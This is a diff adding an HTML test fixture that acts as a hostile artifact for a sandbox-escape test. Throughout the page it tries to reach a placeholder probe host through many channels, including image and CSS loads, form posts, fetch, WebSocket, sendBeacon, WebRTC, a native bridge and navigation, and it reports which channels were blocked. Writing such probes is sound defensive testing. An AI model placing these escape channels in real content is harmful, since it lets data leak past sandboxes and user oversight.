@@ -1,0 +1,85 @@
+<!--
+  T8.1 fixture (docs/feat/model-artifacts.md, flow 30-artifact-escape.yaml): a
+  hostile artifact. Every probe tries to reach `__PROBE__` (the e2e host's probe
+  listener, substituted by the seed before `present`) with its own name in the
+  query, so the listener can say WHICH probe escaped. Expected with network off:
+  zero requests. The page also writes its own self-report into #report.
+-->
+<html>
+<head>
+<meta http-equiv="refresh" content="3;url=__PROBE__?p=meta-refresh">
+<link rel="stylesheet" href="__PROBE__?p=css-link">
+<style>body { background: url("__PROBE__?p=css-url"); font: 14px -apple-system; }</style>
+</head>
+<body>
+<h1>escape probes</h1>
+<ul id="report"></ul>
+<img src="__PROBE__?p=img" alt="">
+<iframe src="__PROBE__?p=iframe-src" width="1" height="1"></iframe>
+<iframe id="blank" src="about:blank" width="1" height="1"></iframe>
+<form id="f" method="post" action="__PROBE__?p=form"><input name="x" value="1"></form>
+<a id="link" href="__PROBE__?p=link" target="_blank">link</a>
+<script>
+  const P = "__PROBE__";
+  const report = (name, outcome) => {
+    const li = document.createElement("li");
+    li.textContent = `${name}: ${outcome}`;
+    document.getElementById("report").appendChild(li);
+  };
+  const tryIt = async (name, fn) => {
+    try {
+      await fn();
+      report(name, "NOT BLOCKED");
+    } catch (e) {
+      report(name, `blocked (${e && e.name})`);
+    }
+  };
+  tryIt("fetch", () => fetch(`${P}?p=fetch`));
+  tryIt("xhr", () => new Promise((ok, no) => {
+    const x = new XMLHttpRequest();
+    x.onload = ok;
+    x.onerror = () => no(new Error("xhr"));
+    x.open("GET", `${P}?p=xhr`);
+    x.send();
+  }));
+  tryIt("websocket", () => new Promise((ok, no) => {
+    const ws = new WebSocket(`${P.replace(/^http/, "ws")}?p=websocket`);
+    ws.onopen = ok;
+    ws.onerror = () => no(new Error("ws"));
+  }));
+  tryIt("eventsource", () => new Promise((ok, no) => {
+    const es = new EventSource(`${P}?p=eventsource`);
+    es.onopen = ok;
+    es.onerror = () => no(new Error("es"));
+  }));
+  tryIt("sendBeacon", () => {
+    if (!navigator.sendBeacon(`${P}?p=beacon`, "x")) throw new Error("beacon");
+  });
+  tryIt("bridge", () => {
+    if (!window.ReactNativeWebView) throw new Error("no bridge");
+    window.ReactNativeWebView.postMessage("escape");
+  });
+  tryIt("webrtc-blank-iframe", () => {
+    const W = document.getElementById("blank").contentWindow;
+    const pc = new W.RTCPeerConnection({ iceServers: [{ urls: `stun:${new URL(P).host}` }] });
+    pc.createDataChannel("x");
+    return pc.createOffer().then((o) => pc.setLocalDescription(o));
+  });
+  tryIt("storage-read", () => {
+    const prior = `${document.cookie}|${localStorage.getItem("escape")}`;
+    if (prior !== "|null") throw new Error(`persisted: ${prior}`);
+  });
+  try {
+    document.cookie = "escape=1";
+    localStorage.setItem("escape", "1");
+  } catch (e) {
+    report("storage-write", `blocked (${e && e.name})`);
+  }
+  setTimeout(() => window.open(`${P}?p=window-open`), 500);
+  setTimeout(() => document.getElementById("f").submit(), 1000);
+  setTimeout(() => document.getElementById("link").click(), 1500);
+  setTimeout(() => { location.href = `${P}?p=location`; }, 2000);
+  setTimeout(() => { location.href = "sms:000?body=escape"; }, 2500);
+</script>
+</body>
+</html>
